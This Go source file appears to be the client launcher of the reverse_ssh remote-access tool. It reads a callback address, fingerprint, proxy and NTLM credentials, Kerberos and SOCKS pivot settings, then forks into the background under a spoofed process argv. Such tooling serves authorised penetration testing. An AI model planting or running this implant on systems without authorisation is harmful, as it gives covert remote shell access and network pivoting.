package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"

	"github.com/NHAS/reverse_ssh/internal/client"
	"github.com/NHAS/reverse_ssh/pkg/logger"
)

var (
	destination    string
	fingerprint    string
	proxy          string
	ignoreInput    string
	customSNI      string
	useKerberos    bool
	useKerberosStr string
	logLevel       string
	ntlmProxyCreds string
	socksPortStr   string
	socksPort      = flag.Int("socks", 0, "Start SOCKS5 proxy server on specified port")
	foreground     = flag.Bool("foreground", false, "Run in foreground")
	fg             = flag.Bool("fg", false, "Run in foreground (shorthand)")
	dest           = flag.String("d", "", "Destination address")
	fprint         = flag.String("fingerprint", "", "Server fingerprint")
	proxyFlag      = flag.String("proxy", "", "Proxy address")
	sniFlag        = flag.String("sni", "", "Custom SNI for TLS")
	kerb           = flag.Bool("kerberos", false, "Use Kerberos authentication")
	logLevelFlag   = flag.String("log-level", "", "Set logging level")
	child          = flag.Bool("child", false, "Internal use only")
	ntlmProxyCredsFlag = flag.String("ntlm-proxy-creds", "", "NTLM proxy credentials in format DOMAIN\\USER:PASS")
)

func fork(path string, sysProcAttr *syscall.SysProcAttr, pretendArgv ...string) error {

	cmd := exec.Command(path)
	cmd.Args = pretendArgv
	cmd.Env = append(os.Environ(), "F="+strings.Join(os.Args, " "))
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.SysProcAttr = sysProcAttr

	err := cmd.Start()

	if cmd.Process != nil {
		cmd.Process.Release()
	}

	return err
}

func printHelp() {
	fmt.Println("Usage: ", filepath.Base(os.Args[0]), "[OPTIONS] <server_address>")
	fmt.Println("\nOptions:")
	fmt.Println("  -d, --destination\tDestination server address")
	fmt.Println("  -fingerprint\t\tServer fingerprint")
	fmt.Println("  -proxy\t\tProxy address")
	fmt.Println("  -sni\t\t\tCustom SNI for TLS")
	fmt.Println("  -kerberos\t\tUse Kerberos authentication")
	fmt.Println("  -log-level\t\tSet logging level")
	fmt.Println("  -socks\t\tStart SOCKS5 proxy server on specified port")
	fmt.Println("  -fg, -foreground\tRun in foreground")
	fmt.Println("  -ntlm-proxy-creds\tNTLM proxy credentials (DOMAIN\\USER:PASS)")
}

func main() {
	flag.Parse()

	// Get values from flags
	if *dest != "" {
		destination = *dest
	}
	if *fprint != "" {
		fingerprint = *fprint
	}
	if *proxyFlag != "" {
		proxy = *proxyFlag
	}
	if *sniFlag != "" {
		customSNI = *sniFlag
	}
	if *kerb {
		useKerberos = true
	}
	if *logLevelFlag != "" {
		logLevel = *logLevelFlag
	}
	if *ntlmProxyCredsFlag != "" {
		ntlmProxyCreds = *ntlmProxyCredsFlag
	}

	// Handle Windows Kerberos
	if runtime.GOOS == "windows" && useKerberosStr == "true" {
		useKerberos = true
	}

	// Handle log level
	if len(logLevel) > 0 {
		u, err := logger.StrToUrgency(logLevel)
		if err != nil {
			log.Printf("Invalid log level %q: %s", logLevel, err)
		} else {
			logger.SetLogLevel(u)
		}
	}

	// Handle NTLM proxy credentials
	if len(ntlmProxyCreds) > 0 {
		client.SetNTLMProxyCreds(ntlmProxyCreds)
	}

	// Get destination from remaining args if not set by flag
	if destination == "" && flag.NArg() > 0 {
		destination = flag.Arg(0)
	}

	if len(destination) == 0 {
		fmt.Println("No destination specified")
		printHelp()
		return
	}

	// Handle socks port
	finalSocksPort := *socksPort
	
	// Check embedded value if not set by flag
	if finalSocksPort == 0 && socksPortStr != "" {
		finalSocksPort, _ = strconv.Atoi(socksPortStr)
	}
	
	// Finally check environment variable
	if finalSocksPort == 0 {
		if portStr, ok := os.LookupEnv("SOCKS_PORT"); ok {
			finalSocksPort, _ = strconv.Atoi(portStr)
		}
	}

	if finalSocksPort > 0 {
		log.Printf("SOCKS5 proxy will be started on port %d", finalSocksPort)
	}

	// Run/fork logic
	if *foreground || *fg || *child {
		Run(destination, fingerprint, proxy, customSNI, useKerberos, finalSocksPort)
		return
	}

	if strings.HasPrefix(destination, "stdio://") {
		log.SetOutput(io.Discard)
		Run(destination, fingerprint, proxy, customSNI, useKerberos, 0) // No socks in stdio mode
		return
	}

	// Create new args array with -child flag
	newArgs := make([]string, 0, len(os.Args)+1)
	newArgs = append(newArgs, os.Args[0])
	newArgs = append(newArgs, "-child") // Add the child flag
	newArgs = append(newArgs, os.Args[1:]...)

	// Fork with modified command line arguments including -child
	err := Fork(destination, fingerprint, proxy, customSNI, useKerberos, newArgs...)
	if err != nil {
		Run(destination, fingerprint, proxy, customSNI, useKerberos, 0) // No socks in fallback mode
	}
}
